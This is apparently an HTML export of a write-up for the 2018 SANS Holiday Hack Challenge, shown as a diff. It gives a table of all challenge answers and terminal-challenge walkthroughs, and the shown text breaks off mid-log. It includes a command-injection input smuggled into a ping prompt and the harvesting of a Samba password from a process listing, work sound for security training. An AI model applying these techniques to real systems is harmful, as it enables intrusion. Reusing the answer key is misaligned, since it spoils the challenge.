@@ -1,0 +1,2367 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>KringleCon_WriteUp.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: "Segoe WPC", "Segoe UI", "SFUIText-Light", "HelveticaNeue-Light", sans-serif, "Droid Sans Fallback";
+	font-size: 14px;
+	padding: 0 12px;
+	line-height: 22px;
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	color: #4080D0;
+	text-decoration: none;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+h1 code,
+h2 code,
+h3 code,
+h4 code,
+h5 code,
+h6 code {
+	font-size: inherit;
+	line-height: auto;
+}
+
+a:hover {
+	color: #4080D0;
+	text-decoration: underline;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left: 5px solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 14px;
+	line-height: 19px;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+.mac code {
+	font-size: 12px;
+	line-height: 18px;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+/** Theming */
+
+.vscode-light,
+.vscode-light pre code {
+	color: rgb(30, 30, 30);
+}
+
+.vscode-dark,
+.vscode-dark pre code {
+	color: #DDD;
+}
+
+.vscode-high-contrast,
+.vscode-high-contrast pre code {
+	color: white;
+}
+
+.vscode-light code {
+	color: #A31515;
+}
+
+.vscode-dark code {
+	color: #D7BA7D;
+}
+
+.vscode-light pre:not(.hljs),
+.vscode-light code > div {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre:not(.hljs),
+.vscode-dark code > div {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre:not(.hljs),
+.vscode-high-contrast code > div {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+.vscode-light blockquote,
+.vscode-dark blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.vscode-high-contrast blockquote {
+	background: transparent;
+	border-color: #fff;
+}
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family:  "Meiryo", "Segoe WPC", "Segoe UI", "SFUIText-Light", "HelveticaNeue-Light", sans-serif, "Droid Sans Fallback";
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+</head>
+<body>
+<h1 id="the-2018-sans-holiday-hack-challenge-by-yasulib">THE 2018 SANS HOLIDAY HACK CHALLENGE By yasulib</h1>
+<!-- TOC -->
+<ul>
+<li><a href="#the-2018-sans-holiday-hack-challenge-by-yasulib">THE 2018 SANS HOLIDAY HACK CHALLENGE By yasulib</a>
+<ul>
+<li><a href="#tldr-quick-answers">tl;dr: Quick Answers</a></li>
+<li><a href="#terminal-challenges">TERMINAL CHALLENGES</a>
+<ul>
+<li><a href="#essential-editor-skills">Essential Editor Skills</a></li>
+<li><a href="#the-name-game">The Name Game</a></li>
+<li><a href="#lethal-forensicelfication">Lethal ForensicELFication</a></li>
+<li><a href="#stall-mucking-report">Stall Mucking Report</a></li>
+<li><a href="#curling-master">CURLing Master</a></li>
+<li><a href="#yule-log-analysis">Yule Log Analysis</a></li>
+<li><a href="#dev-ops-fail">Dev Ops Fail</a></li>
+<li><a href="#python-escape-from">Python Escape from</a></li>
+<li><a href="#the-sleighbell">The Sleighbell</a></li>
+</ul>
+</li>
+<li><a href="#questions">Questions</a>
+<ul>
+
+<li><a href="#1-orientation-challenge">1 : Orientation Challenge</a></li>
+<li><a href="#2-directory-bwosing">2 : Directory Bwosing</a></li>
+<li><a href="#3-de-bruijn-sequences">3 : de Bruijn Sequences</a></li>
+<li><a href="#4-data-repo-analysis">4 : Data Repo Analysis</a></li>
+<li><a href="#5-ad-privilege-discovery">5 : AD Privilege Discovery</a></li>
+<li><a href="#6-badge-manipulation">6 : Badge Manipulation</a>
+<ul>
+<li><a href="#solution1-upload-qr-code-from-the-usb-mark">Solution1: Upload QR code from the USB mark.</a></li>
+<li><a href="#solution2-click-the-fingerprint-authentication-mark">Solution2: Click the fingerprint authentication mark.</a></li>
+</ul>
+</li>
+<li><a href="#7-hr-incident-response">7 : HR Incident Response</a></li>
+<li><a href="#8-network-traffic-forensics">8 : Network Traffic Forensics</a></li>
+<li><a href="#9-ransomware-recovery">9 : Ransomware Recovery</a>
+<ul>
+<li><a href="#9-1-catch-the-malware">9-1 : Catch the Malware</a></li>
+<li><a href="#9-2-identify-the-domain">9-2 : Identify the Domain</a></li>
+<li><a href="#9-3-stop-the-malware">9-3 : Stop the Malware</a></li>
+<li><a href="#9-4-recover-alabasters-password">9-4 : Recover Alabaster's Password</a></li>
+</ul>
+</li>
+<li><a href="#10-who-is-behind-it-all">10 : Who Is Behind It All?</a>
+<ul>
+<li><a href="#pianolock">Pianolock</a></li>
+<li><a href="#in-santas-vault">In Santa's vault</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- /TOC -->
+<h2 id="tldr-quick-answers">tl;dr: Quick Answers</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">#</th>
+<th style="text-align:left">Title</th>
+<th style="text-align:left">Answer</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">1</td>
+<td style="text-align:left">Orientation Challenge</td>
+<td style="text-align:left">Happy Trails</td>
+</tr>
+<tr>
+<td style="text-align:left">2</td>
+<td style="text-align:left">Directory Bwosing</td>
+<td style="text-align:left">John McClane</td>
+</tr>
+<tr>
+<td style="text-align:left">3</td>
+<td style="text-align:left">de Bruijn Sequences</td>
+<td style="text-align:left">Welcome unprepared speaker!</td>
+</tr>
+<tr>
+<td style="text-align:left">4</td>
+<td style="text-align:left">Data Repo Analysis</td>
+<td style="text-align:left">Yippee-ki-yay</td>
+</tr>
+<tr>
+<td style="text-align:left">5</td>
+<td style="text-align:left">AD Privilege Discovery</td>
+<td style="text-align:left">LDUBEJ00320@AD.KRINGLECASTLE.COM</td>
+</tr>
+<tr>
+<td style="text-align:left">6</td>
+<td style="text-align:left">Badge Manipulation</td>
+<td style="text-align:left">19880715</td>
+</tr>
+<tr>
+<td style="text-align:left">7</td>
+<td style="text-align:left">HR Incident Response</td>
+<td style="text-align:left">Fancy Beaver</td>
+</tr>
+<tr>
+<td style="text-align:left">8</td>
+<td style="text-align:left">Network Traffic Forensics</td>
+<td style="text-align:left">Mary Had a Little Lamb</td>
+</tr>
+<tr>
+<td style="text-align:left">9-1</td>
+<td style="text-align:left">Ransomware Recovery(Catch the Malware)</td>
+<td style="text-align:left">Snort is alerting on all ransomware and only the ransomware!</td>
+</tr>
+<tr>
+<td style="text-align:left">9-2</td>
+<td style="text-align:left">Ransomware Recovery(Identify the Domain)</td>
+<td style="text-align:left">erohetfanu.com</td>
+</tr>
+<tr>
+<td style="text-align:left">9-3</td>
+<td style="text-align:left">Ransomware Recovery(Stop the Malware)</td>
+<td style="text-align:left">Successfully registered yippeekiyaa.aaay!</td>
+</tr>
+<tr>
+<td style="text-align:left">9-4</td>
+<td style="text-align:left">Ransomware Recovery(Recover Alabaster's Password)</td>
+<td style="text-align:left">ED#ED#EED#EF#G#F#G#ABA#BA#B</td>
+</tr>
+<tr>
+<td style="text-align:left">10</td>
+<td style="text-align:left">Who Is Behind It All?</td>
+<td style="text-align:left">Santa</td>
+</tr>
+</tbody>
+</table>
+<h2 id="terminal-challenges">TERMINAL CHALLENGES</h2>
+<h3 id="essential-editor-skills">Essential Editor Skills</h3>
+<p><code>Exit vi and back to shell</code></p>
+<ol>
+<li>Press the key: <code>&lt;ESCAPE&gt;</code></li>
+<li>Press the key: <code>:q</code></li>
+<li>Press the key: <code>&lt;ENTER&gt;</code></li>
+</ol>
+<h3 id="the-name-game">The Name Game</h3>
+<p><code>Find the first name of &quot;Chan!&quot; and submit to runtoanswer.</code></p>
+<p>The program has a vulnerability which is os command injection.</p>
+<pre class="hljs"><code><div> Press  1 to start the onboard process.
+ Press  2 to verify the system.
+ Press  q to quit.
+
+Please make a selection: 2
+----------------------------------------
+Validating data store for employee onboard information.
+Enter address of server: : 127.0.0.1
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.052 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.046 ms
+
+--- 127.0.0.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2034ms
+rtt min/avg/max/mdev = 0.043/0.047/0.052/0.003 ms
+onboard.db: SQLite 3.x database
+Press Enter to continue...: 
+</div></code></pre>
+<ul>
+<li>OS command execution : <code>ping -c 3 &lt;USERINPUT&gt;</code></li>
+<li>SQLite 3.x database filename : <code>onboard.db</code></li>
+<li>Program to answer : <code>runtoanswer</code></li>
+</ul>
+<p>So I input the <code>;sqlite3 onboard.db;runtoanswer</code>.
+Then exec program is :</p>
+<pre class="hljs"><code><div>ping -c 3 ;sqlite3 onboard.db;runtoanswer
+</div></code></pre>
+<pre class="hljs"><code><div>Validating data store for employee onboard information.
+Enter address of server: ;sqlite3 onboard.db;runtoanswer
+Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
+            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
+            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
+            [-w deadline] [-W timeout] [hop1 ...] destination
+SQLite version 3.11.0 2016-02-15 17:29:24
+Enter &quot;.help&quot; for usage hints.
+sqlite&gt; .table
+onboard
+sqlite&gt; .schema onboard
+CREATE TABLE onboard (
+    id INTEGER PRIMARY KEY,
+    fname TEXT NOT NULL,
+    lname TEXT NOT NULL,
+    street1 TEXT,
+    street2 TEXT,
+    city TEXT,
+    postalcode TEXT,
+    phone TEXT,
+    email TEXT
+);
+sqlite&gt; SELECT fname FROM onboard WHERE lname='Chan';
+Scott
+sqlite&gt; 
+Loading, please wait......
+Enter Mr. Chan's first name: Scott
+</div></code></pre>
+<p>Mr. Chan's first name is <code>Scott</code>.</p>
+<h3 id="lethal-forensicelfication">Lethal ForensicELFication</h3>
+<p><code>Find the first name of the elf of whom a love poem was written.</code></p>
+<pre class="hljs"><code><div>elf@728138d2a9f2:~$ ls -la
+total 5460
+drwxr-xr-x 1 elf  elf     4096 Dec 14 16:28 .
+drwxr-xr-x 1 root root    4096 Dec 14 16:28 ..
+-rw-r--r-- 1 elf  elf      419 Dec 14 16:13 .bash_history
+-rw-r--r-- 1 elf  elf      220 May 15  2017 .bash_logout
+-rw-r--r-- 1 elf  elf     3540 Dec 14 16:28 .bashrc
+-rw-r--r-- 1 elf  elf      675 May 15  2017 .profile
+drwxr-xr-x 1 elf  elf     4096 Dec 14 16:28 .secrets
+-rw-r--r-- 1 elf  elf     5063 Dec 14 16:13 .viminfo
+-rwxr-xr-x 1 elf  elf  5551072 Dec 14 16:13 runtoanswer
+
+elf@728138d2a9f2:~$ find .secrets/ -type f
+.secrets/her/poem.txt
+
+elf@728138d2a9f2:~$ cat .secrets/her/poem.txt 
+Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,
+Shining many a beautiful sleighbell bearing cheer and sound so pure--
+  There he cleaned them, nearly napping, suddenly there came a tapping,
+As of someone gently rapping, rapping at the sleigh house door.
+&quot;'Tis some caroler,&quot; he muttered, &quot;tapping at my sleigh house door--
+  Only this and nothing more.&quot;
+
+Then, continued with more vigor, came the sound he didn't figure,
+Could belong to one so lovely, walking 'bout the North Pole grounds.
+  But the truth is, she WAS knocking, 'cause with him she would be talking,
+Off with fingers interlocking, strolling out with love newfound?
+Gazing into eyes so deeply, caring not who sees their rounds.
+  Oh, 'twould make his heart resound!
+
+Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.
+Floating over, more than walking, moving toward the sound still knocking,
+  Pausing at the elf-length mirror, checked himself to study clearer,
+Fixing hair and looking nearer, what a hunky elf - not shocking!
+Peering through the peephole smiling, reaching forward and unlocking:
+  NEVERMORE in tinsel stocking!
+
+Greeting her with smile dashing, pearly-white incisors flashing,
+Telling jokes to keep her laughing, soaring high upon the tidings,
+  Of good fortune fates had borne him.  Offered her his dexter forelimb,
+Never was his future less dim!  Should he now consider gliding--
+No - they shouldn't but consider taking flight in sleigh and riding
+  Up above the Pole abiding?
+
+Smile, she did, when he suggested that their future surely rested,
+Up in flight above their cohort flying high like ne'er before!
+  So he harnessed two young reindeer, bold and fresh and bearing no fear.
+In they jumped and seated so near, off they flew - broke through the door!
+Up and up climbed team and humor, Morcel being so adored,
+  By his lovely NEVERMORE!
+
+-Morcel Nougat
+</div></code></pre>
+<ul>
+<li><code>~/.viminfo</code> has a vim command history.</li>
+<li><code>NEVERMORE</code> was replaced from elf name.</li>
+</ul>
+<pre class="hljs"><code><div>elf@c6e07de519cf:~$ more ~/.viminfo 
+# This viminfo file was generated by Vim 8.0.
+# You may edit it if you're careful!
+
+# Viminfo version
+|1,4
+
+# Value of 'encoding' when this file was written
+*encoding=utf-8
+
+
+# hlsearch on (H) or off (h):
+~h
+# Last Substitute Search Pattern:
+~MSle0~&amp;Elinore
+
+# Last Substitute String:
+$NEVERMORE
+
+# Command Line History (newest to oldest):
+:wq
+|2,0,1536607231,,&quot;wq&quot;
+:%s/Elinore/NEVERMORE/g
+|2,0,1536607217,,&quot;%s/Elinore/NEVERMORE/g&quot;
+:r .secrets/her/poem.txt
+|2,0,1536607201,,&quot;r .secrets/her/poem.txt&quot;
+:q
+...(snip)...
+</div></code></pre>
+<p>So <code>:%s/Elinore/NEVERMORE/g</code> indicates that the first name of elf is <code>Elinore</code>.</p>
+<h3 id="stall-mucking-report">Stall Mucking Report</h3>
+<p><code>Upload report.txt to samba server at //localhost/report-upload/</code></p>
+<pre class="hljs"><code><div>elf@5a873edadfcc:~$ ps -ef |tee -a /tmp/a
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 08:53 pts/0    00:00:00 /bin/bash /sbin/init
+root        11     1  0 08:53 pts/0    00:00:00 sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
+root        12     1  0 08:53 pts/0    00:00:00 sudo -E -u manager /usr/bin/python /home/manager/report-check.py
+root        16     1  0 08:53 pts/0    00:00:00 sudo -u elf /bin/bash
+manager     17    12  0 08:53 pts/0    00:00:00 /usr/bin/python /home/manager/report-check.py
+manager     18    11  0 08:53 pts/0    00:00:00 /bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
+elf         19    16  0 08:53 pts/0    00:00:00 /bin/bash
+manager     22    18  0 08:53 pts/0    00:00:00 sleep 60
+root        25     1  0 08:53 ?        00:00:00 /usr/sbin/smbd
+root        26    25  0 08:53 ?        00:00:00 /usr/sbin/smbd
+root        27    25  0 08:53 ?        00:00:00 /usr/sbin/smbd
+root        29    25  0 08:53 ?        00:00:00 /usr/sbin/smbd
+elf         31    19  0 08:53 pts/0    00:00:00 ps -ef
+elf         32    19  0 08:53 pts/0    00:00:00 tee -a /tmp/a
+</div></code></pre>
+<p>The password was showed in <code>/bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload</code>.</p>
+<ul>
+<li>Username : <code>report-upload</code></li>
+<li>Password : <code>directreindeerflatterystable</code></li>
+<li>Service Name : <code>//localhost/report-upload/</code></li>
+</ul>
+<pre class="hljs"><code><div>elf@5a873edadfcc:~$ smbclient //localhost/report-upload/ directreindeerflatterystable -U report-upload
+WARNING: The &quot;syslog&quot; option is deprecated
+Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
+smb: \&gt; put report.txt
+putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)
+</div></code></pre>
+<h3 id="curling-master">CURLing Master</h3>
+<p><code>submitting the right HTTP request to the server at http://localhost:8080/</code></p>
+<pre class="hljs"><code><div>elf@d8df11e4f5fd:~$ curl -v http://localhost:8080/ 
+*   Trying 127.0.0.1...
+* TCP_NODELAY set
+* Connected to localhost (127.0.0.1) port 8080 (#0)
+&gt; GET / HTTP/1.1
+&gt; Host: localhost:8080
+&gt; User-Agent: curl/7.52.1
+&gt; Accept: */*
+&gt; 
+* Curl_http_done: called premature == 0
+* Connection #0 to host localhost left intact
+����
+
+elf@d8df11e4f5fd:~$ ps -ef 
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 09:15 pts/0    00:00:00 /bin/bash /sbin/init
+root        10     1  0 09:15 pts/0    00:00:00 nginx: master process /usr/sbin/nginx -g daemon off;
+root        13     1  0 09:15 pts/0    00:00:00 sudo -u elf /bin/bash
+elf         14    13  0 09:15 pts/0    00:00:00 /bin/bash
+www-data    17    10  0 09:15 pts/0    00:00:00 nginx: worker process
+www-data    18    10  0 09:15 pts/0    00:00:00 nginx: worker process
+www-data    19    10  0 09:15 pts/0    00:00:00 nginx: worker process
+www-data    21    10  0 09:15 pts/0    00:00:00 nginx: worker process
+www-data    22    10  0 09:15 pts/0    00:00:00 nginx: worker process
+www-data    23    10  0 09:15 pts/0    00:00:00 nginx: worker process
+www-data    24    10  0 09:15 pts/0    00:00:00 nginx: worker process
+www-data    25    10  0 09:15 pts/0    00:00:00 nginx: worker process
+root        26     1  0 09:15 ?        00:00:00 php-fpm: master process (/etc/php/7.0/fpm/php-fpm.conf)
+www-data    27    26  0 09:15 ?        00:00:00 php-fpm: pool www
+www-data    28    26  0 09:15 ?        00:00:00 php-fpm: pool www
+elf         31    14  0 09:16 pts/0    00:00:00 ps -ef
+
+elf@d8df11e4f5fd:~$ more /etc/nginx/nginx.conf 
+user www-data;
+worker_processes auto;
+pid /run/nginx.pid;
+include /etc/nginx/modules-enabled/*.conf;
+
+events {
+        worker_connections 768;
+        # multi_accept on;
+}
+
+http {
+
+        sendfile on;
+        tcp_nopush on;
+        tcp_nodelay on;
+        keepalive_timeout 65;
+        types_hash_max_size 2048;
+        # server_tokens off;
+
+        # server_names_hash_bucket_size 64;
+        # server_name_in_redirect off;
+
+        include /etc/nginx/mime.types;
+        default_type application/octet-stream;
+
+        server {
+        # love using the new stuff! -Bushy
+                listen                  8080 http2;
+                # server_name           localhost 127.0.0.1;
+                root /var/www/html;
+...(snip)...
+</div></code></pre>
+<ul>
+<li>nginx is running on 8080/tcp</li>
+<li>http2 is enable, but SSL is not enable</li>
+</ul>
+<pre class="hljs"><code><div>elf@d8df11e4f5fd:~$ curl --help | grep http2
+     --http2         Use HTTP 2 (H)
+     --http2-prior-knowledge  Use HTTP 2 without HTTP/1.1 Upgrade (H)
+
+elf@d8df11e4f5fd:~$ curl --http2-prior-knowledge http://localhost:8080/
+&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;Candy Striper Turner-On'er&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+ &lt;p&gt;To turn the machine on, simply POST to this URL with parameter &quot;status=on&quot;
+
+ 
+ &lt;/body&gt;
+&lt;/html&gt;
+
+elf@d8df11e4f5fd:~$ curl -X POST -d &quot;status=on&quot; --http2-prior-knowledge http://localhost:8080/
+&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;Candy Striper Turner-On'er&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+ &lt;p&gt;To turn the machine on, simply POST to this URL with parameter &quot;status=on&quot;
+
+                                                                                
+                                                                okkd,          
+                                                               OXXXXX,         
+                                                              oXXXXXXo         
+                                                             ;XXXXXXX;         
+                                                            ;KXXXXXXx          
+                                                           oXXXXXXXO           
+                                                        .lKXXXXXXX0.           
+  ''''''       .''''''       .''''''       .:::;   ':okKXXXXXXXX0Oxcooddool,   
+ 'MMMMMO',,,,,;WMMMMM0',,,,,;WMMMMMK',,,,,,occccoOXXXXXXXXXXXXXxxXXXXXXXXXXX.  
+ 'MMMMN;,,,,,'0MMMMMW;,,,,,'OMMMMMW:,,,,,'kxcccc0XXXXXXXXXXXXXXxx0KKKKK000d;   
+ 'MMMMl,,,,,,oMMMMMMo,,,,,,lMMMMMMd,,,,,,cMxcccc0XXXXXXXXXXXXXXOdkO000KKKKK0x. 
+ 'MMMO',,,,,;WMMMMMO',,,,,,NMMMMMK',,,,,,XMxcccc0XXXXXXXXXXXXXXxxXXXXXXXXXXXX: 
+ 'MMN,,,,,,'OMMMMMW;,,,,,'kMMMMMW;,,,,,'xMMxcccc0XXXXXXXXXXXXKkkxxO00000OOx;.  
+ 'MMl,,,,,,lMMMMMMo,,,,,,cMMMMMMd,,,,,,:MMMxcccc0XXXXXXXXXXKOOkd0XXXXXXXXXXO.  
+ 'M0',,,,,;WMMMMM0',,,,,,NMMMMMK,,,,,,,XMMMxcccckXXXXXXXXXX0KXKxOKKKXXXXXXXk.  
+ .c.......'cccccc.......'cccccc.......'cccc:ccc: .c0XXXXXXXXXX0xO0000000Oc     
+                                                    ;xKXXXXXXX0xKXXXXXXXXK.    
+                                                       ..,:ccllc:cccccc:'      
+                                                                               
+
+Unencrypted 2.0? He's such a silly guy.
+That's the kind of stunt that makes my OWASP friends all cry.
+Truth be told: most major sites are speaking 2.0;
+TLS connections are in place when they do so.
+
+-Holly Evergreen
+&lt;p&gt;Congratulations! You've won and have successfully completed this challenge.
+&lt;p&gt;POSTing data in HTTP/2.0.
+
+ &lt;/body&gt;
+&lt;/html&gt;
+</div></code></pre>
+<h3 id="yule-log-analysis">Yule Log Analysis</h3>
+<p><code>Find compromised webmail username</code></p>
+<p>I focused on two EventIDs(4624, 4625).</p>
+<ul>
+<li>EID:4624 is <em>&quot;An account was successfully logged on&quot;</em></li>
+<li>EID:4625 is <em>&quot;An account failed to log on&quot;</em></li>
+</ul>
+<p>When the EID:4625 is continuous and suddenly EID:4624 appears, the user who is logged on is likely to be compromised.
+But <code>HealthMailbox.*</code> user is excluded because they are used by the monitoring system.</p>
+<pre class="hljs"><code><div>elf@84c307779471:~$ python evtx_dump.py ho-ho-no.evtx &gt; /tmp/dump.txt
+elf@84c307779471:~$ grep -E '462[45]' /tmp/dump.txt -A35 | grep -E '(TargetUserName|EventID)'  | perl -pe 's/&lt;\/EventID&gt;\n//' | grep -v HealthMailbox
+...(snip)...
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;mark.johnson&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;mark.jones&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;mark.smith&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;mark.williams&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;mary.smith&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;matt.johnson&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;matt.smith&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;matthew.smith&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;melissa.smith&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;michael.brown&lt;/Data&gt;
+&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;Data Name=&quot;TargetUserName&quot;&gt;michael.davis&lt;/Data&gt;
